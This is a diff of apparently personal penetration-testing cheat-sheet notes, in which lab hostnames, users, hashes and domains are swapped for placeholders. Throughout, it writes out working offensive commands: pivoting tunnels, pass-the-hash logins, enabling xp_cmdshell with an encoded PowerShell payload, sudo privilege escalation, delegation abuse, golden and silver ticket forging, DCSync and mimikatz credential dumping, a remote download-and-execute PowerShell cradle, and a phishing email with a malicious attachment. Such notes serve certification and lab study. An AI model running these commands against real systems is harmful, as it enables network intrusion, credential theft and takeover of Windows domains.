@@ -28,7 +28,7 @@ sudo ip route add 240.0.0.1/32 dev ligolo
 nmap 240.0.0.1 -sV
 
 //create additional listener
-[Agent : FAKE\web_svc@MS01] » listener_add --addr 0.0.0.0:4444 --to 0.0.0.0:4445 --tcp
+[Agent : FAKE\web_svc@Target1] » listener_add --addr 0.0.0.0:4444 --to 0.0.0.0:4445 --tcp
 nc -nlvp 4445 //connect
 python3 -m http.server 4445 //transfer file
 ```
@@ -294,7 +294,7 @@ winrm
 
 ```jsx
 evil-winrm -i 192.168.1.1 -u admin -p "password\!"
-evil-winrm -i 10.10.1.2 -u admin -H e728ecbe728ecbe728ecbcbadfb02f51
+evil-winrm -i 10.10.1.2 -u admin -H e72ce72ce72ce72ce72ce72ce72c
 ```
 
 ssh
@@ -310,7 +310,7 @@ Sql
 psql -h 192.168.1.1 -p 5432 -U testuse
 
 //mssql
-sqsh -S 240.0.0.1:1434 -U admin -P passowrd -D umbraco 
+sqsh -S 240.0.0.1:1434 -U admin -P passowrd -D dave 
 1> select 1;
 2> go
 
@@ -382,7 +382,7 @@ Test invalid url. HTTP Error 400. The request hostname is invalid.
 
 ```jsx
 //Got hostname from nmap
-https://ms01.fake:8443/
+https://Target1.fake:8443/
 ```
 
 More Info after adding hostname to /etc/hosts
@@ -393,7 +393,7 @@ More Info after adding hostname to /etc/hosts
 ```jsx
 //Got hostname from webpage
 http://192.168.1.1:24680
-http://skylark.jp:24680
+http://fake.com:24680
 ```
 
 ### **Directory Scan**
@@ -682,7 +682,7 @@ translate different language to english
 
 ```jsx
 //domain name
-slaes@skylak.jp
+market@fake.jp
 ```
 
 phpinfo.php
@@ -788,7 +788,7 @@ Get info from downloaded pdf
 exiftool -a -u *.pdf
 
 //encrypted pdf
-pdf2john Infrastructure.pdf > pdf.hash
+pdf2john Document.pdf > pdf.hash
 john --wordlist=/usr/share/wordlists/rockyou.txt pdf.hash
 //show cracked password
 john pdf.hash --show
@@ -981,8 +981,8 @@ rce
 ```jsx
 SQL (FAKE\sql_svc  dbo@master)> EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 
-[*] INFO(MS02\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
-[*] INFO(MS02\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
+[*] INFO(Target2\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+[*] INFO(Target2\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
 
 SQL (FAKE\sql_svc  dbo@master)> EXEC xp_cmdshell 'powershell -e JABjAGwAaQ...';
 ```
@@ -990,7 +990,7 @@ LigoloNG: Add tunnel bridge if mssql can only access internal machine
 
 
 ```jsx
-[Agent : OSCP\web_svc@MS01] » listener_add --addr 0.0.0.0:8082 --to 0.0.0.0:8081 --tcp
+[Agent : OSCP\web_svc@Target1] » listener_add --addr 0.0.0.0:8082 --to 0.0.0.0:8081 --tcp
 //transfer file
 python3 -m http.server 8081 #klai
 iwr -uri http://10.10.185.147:8082/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe 
@@ -1018,7 +1018,7 @@ foxyproxy extension for firefox
 ### 3387 - Alternative port for Rdp
 
 ```jsx
-xfreerdp cpub-SkylarkStatus-QuickSessionCollection-CmsRdsh.rdp  /u:kiosk /p:password /d:skylark.com /v:192.168.1.1
+xfreerdp cpub-QuickSessionCollection-CmsRdsh.rdp  /u:dave /p:password123 /d:fake.com /v:192.168.1.1
 ```
 
 ### 5985 - Winrm
@@ -1491,7 +1491,7 @@ Try ssh/psexec/wmiexec/rdp
 GET reuqest
 
 ```jsx
-curl http://nickel #cmd
+curl http://fake #cmd
 Invoke-WebRequest -UseBasicParsing -Uri http://example.com/ #powershell
 ```
 
@@ -1592,9 +1592,9 @@ sudo -i
 //(ALL) NOPASSWD: /usr/bin/psql
 https://gtfobins.github.io/gtfobins/psql/#sudo
 
-//(ALL) NOPASSWD: /usr/bin/ruby /home/andrew/app/app.rb
+//(ALL) NOPASSWD: /usr/bin/ruby /home/dave/app/app.rb
 echo 'exec "/bin/bash"' > app.rb
-sudo /usr/bin/ruby /home/andrew/app/app.rb
+sudo /usr/bin/ruby /home/dave/app/app.rb
 
 ls -l /etc/sudoers
 
@@ -1873,14 +1873,14 @@ Analysis => Shortest Paths => Shortest Paths to Domain Admins
 
 ### Object Permissions
 
-`Generic All` on resourcedDC.resourced.local (computer) ⇒ resource-based constrained delegation attack
+`Generic All` on fakedDC.faked.local (computer) ⇒ resource-based constrained delegation attack
 
 ```jsx
 .\StandIn45.exe --computer xct --make //create new computer
 
-[?] Using DC    : ResourceDC.resourced.local
-    |_ Domain   : resourced.local
-    |_ DN       : CN=xct,CN=Computers,DC=resourced,DC=local
+[?] Using DC    : fakeDC.faked.local
+    |_ Domain   : faked.local
+    |_ DN       : CN=xct,CN=Computers,DC=faked,DC=local
     |_ Password : jZHKk2l8l9D9buy
 
 
@@ -1888,13 +1888,13 @@ Get-ADComputer -Filter * | Select-Object Name,SID //get old computer name
 
 Name       SID
 ----       ---
-RESOURCEDC S-1-5-21-537427935-490066102-1511301751-1000
+FAKEDC S-1-5-21-537427935-490066102-1511301751-1000
 xct        S-1-5-21-537427935-490066102-1511301751-4101
 
 
-.\StandIn45.exe --computer ResourceDC --sid S-1-5-21-537427935-490066102-1511301751-4101 //msDS-AllowedToActOnBehalfOfOtherIdentity
+.\StandIn45.exe --computer FakeDC --sid S-1-5-21-537427935-490066102-1511301751-4101 //msDS-AllowedToActOnBehalfOfOtherIdentity
 .\Rubeus.exe hash /password:pasSw0rd123 //rc4
-.\Rubeus.exe s4u /user:xct /rc4:CB1E5A37CC2C4958AE0E7AC1E575D72E /impersonateuser:administrator /msdsspn:cifs/resourcedc.resourced.local /nowrap /ptt //create ticket
+.\Rubeus.exe s4u /user:xct /rc4:CB1CCB1CCB1CCB1CCB1CCB1CCB1C /impersonateuser:administrator /msdsspn:cifs/fakedc.faked.local /nowrap /ptt //create ticket
 
 //cifs => login via psexec
 mousepad ticket.b64 #copy new ticket to kali
@@ -1902,8 +1902,8 @@ cat ticket.b64| base64 -d > ticket.kirbi
 impacket-ticketConverter ticket.kirbi ticket.ccache
 export KRB5CCNAME=`pwd`/ticket.ccache
 klist #sudo apt-get install krb5-user
-sudo sh -c 'echo "192.168.1.1 resourcedc.resourced.local" >> /etc/hosts'
-sudo impacket-psexec -k -no-pass resourced.local/Administrator@resourcedc.resourced.local -dc-ip 192.168.180.175
+sudo sh -c 'echo "192.168.1.1 fakedc.faked.local" >> /etc/hosts'
+sudo impacket-psexec -k -no-pass faked.local/Administrator@fakedc.faked.local -dc-ip 192.168.180.175
 
 ```
 
@@ -1962,13 +1962,13 @@ Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "alice"}
 //check genericAll => bloodhound
 Get-ObjectAcl -Identity "Domain Users" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
 "S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
-net group "Management Department" stephanie /add /domain
+net group "Management Department" dave /add /domain
 
 //Group Policy
 Get-GPO -Name "Default Domain Policy"
-Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName anirudh
+Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName dave
 //Permission  : GpoEditDeleteModifySecurity
-.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount dave --GPOName "Default Domain Policy"
 gpupdate /force
 ```
 
@@ -1990,7 +1990,7 @@ nxc  smb 172.16.1.1 -u 'user' -p 'pass' -M spider_plus -o DOWNLOAD_FLAG=True
 nxc winrm 192.168.1.1  -u user.txt -H crack --no-bruteforce --continue-on-success
 
 //non domain user
-nxc winrm 10.10.111.1 -u user.txt -p pass -d MS02
+nxc winrm 10.10.111.1 -u user.txt -p pass -d Target2
 
 impacket-psexec dave@172.16.1.1
 //specify domain name for administrator
@@ -2010,9 +2010,9 @@ Spary NTLM hash
 //test smb(139,445),wmi(135),rdp(3389),winrm(5985)
 nxc smb 10.10.1.1 -u bob.alice -H e728ecbbbbbbbbbbbbbb
 //spray local
-nxc winrm 10.10.1.1 -u user.txt -p passW0rd -d ms02
+nxc winrm 10.10.1.1 -u user.txt -p passW0rd -d Target2
 evil-winrm -i 10.10.1.1 -u bob.alice -H e728ecbbbbbbbbbbbbbb
-xfreerdp /v:192.168.1.1 /u:resourced.local/L.Livingstone /pth:19a3a7550ce8c505c2d46b5e39d6f808 +clipboard +drive:share,/tmp
+xfreerdp /v:192.168.1.1 /u:fake.com/dave /pth:19b219b219b219b219b2 +clipboard +drive:share,/tmp
 ```
 
 Passing NTLM
@@ -2043,7 +2043,7 @@ lsadump::trust
  "token::elevate" "lsadump::sam"
  
  //require local admin
-impacket-secretsdump MS02/Administrator:password@10.10.1.1
+impacket-secretsdump Target2/Administrator:password@10.10.1.1
  
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 secretsdump.py fake.com/Administrator:password@192.168.1.1
@@ -2125,11 +2125,11 @@ sekurlsa::logonpasswords
 whoami /user
 klist
 //inject ticket
-kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:dave
-iwr -UseDefaultCredentials http://web04
+kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:fake.com /ptt /target:web01.fake.com /service:http /rc4:rc4rc4rc4rc4rc4rc4rc4rc4 /user:dave
+iwr -UseDefaultCredentials http://web01
 
-Rubeus.exe silver /service:MSSQKSvc/kerbdc1.kerb.local:1433 /rc4:4d28cf5252d39971419580a51484ca09 /sid:S-1-5-21-1987370270-658905905-1781884369 /user:administrator /domain:kerb.local /ptt
-sqlcmd -S kerbdc1.kerb.local
+Rubeus.exe silver /service:MSSQKSvc/dc1.fake.local:1433 /rc4:rc4rc4rc4rc4rc4rc4rc4rc4 /sid:S-1-5-21-1987370270-658905905-1781884369 /user:administrator /domain:fake.local /ptt
+sqlcmd -S dc1.fake.local
 ```
 
 ### DCSync Attack
@@ -2150,15 +2150,15 @@ impacket-secretsdump -just-dc-user dave fake.com/bob:"password\!"@192.168.1.1
 Access
 
 ```jsx
-winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAA...
-./PsExec64.exe -i  \\FILES04 -u corp\jen -p password! cmd
+winrs -r:files04 -u:dave -p:Password123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAA...
+./PsExec64.exe -i  \\FILES04 -u fake\dave -p Password123! cmd
 ```
 
 Overpass the hash
 
 ```jsx
 sekurlsa::logonpasswords
-sekurlsa::pth /user:dave /domain:fake.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
+sekurlsa::pth /user:dave /domain:fake.com /ntlm:3d9d3d9d3d9d3d9d3d9d3d9d3d9d /run:powershell
 klist
 net use \\file04
 klist
@@ -2188,7 +2188,7 @@ $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -no
 lsadump::lsa /patch
 //clean ticket
 kerberos::purge
-kerberos::golden /user:jen /domain:fake.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+kerberos::golden /user:dave /domain:fake.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:3d9d3d9d3d9d3d9d3d9d3d9d3d9d /ptt
 misc::cmd
 //access
 PsExec.exe \\dc1 cmd.exe
@@ -2234,12 +2234,12 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://1
 wsgidav --port=80 --host=0.0.0.0 --root=/home/kali/Desktop/tools/phishing/webdav --auth=anonymous
 
 //exploit1:sending phishing email
-sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.167.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
+sudo swaks -t dave@fake.com --from mailadmin@fake.com --attach @config.Library-ms --server 192.168.10.1 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
 Username: 
 Password: 
 
 //exploit2:simulating clicking from share
-smbclient //192.168.50.195/share -c 'put config.Library-ms'
+smbclient //192.168.50.1/share -c 'put config.Library-ms'
 ```
 
 # Credentials
@@ -2422,10 +2422,10 @@ Postgresql connection error (incompatible with openssl 3.2): purge and reinstall
 
 ```jsx
 
-psql: error: connection to server at "192.168.165.47", port 5437 failed: FATAL:  no PostgreSQL user name specified in startup packet
-connection to server at "192.168.165.47", port 5437 failed: FATAL:  no PostgreSQL user name specified in startup packet
+psql: error: connection to server at "192.168.165.10", port 5437 failed: FATAL:  no PostgreSQL user name specified in startup packet
+connection to server at "192.168.165.10", port 5437 failed: FATAL:  no PostgreSQL user name specified in startup packet
 double free or corruption (out)
-zsh: IOT instruction  psql -h 192.168.165.47 -U postgres -p 5437 -d postgres
+zsh: IOT instruction  psql -h 192.168.165.10 -U postgres -p 5437 -d postgres
 
 sudo apt-get purge postgresql 'postgresql-*' -y
 sudo apt-get install postgresql-16
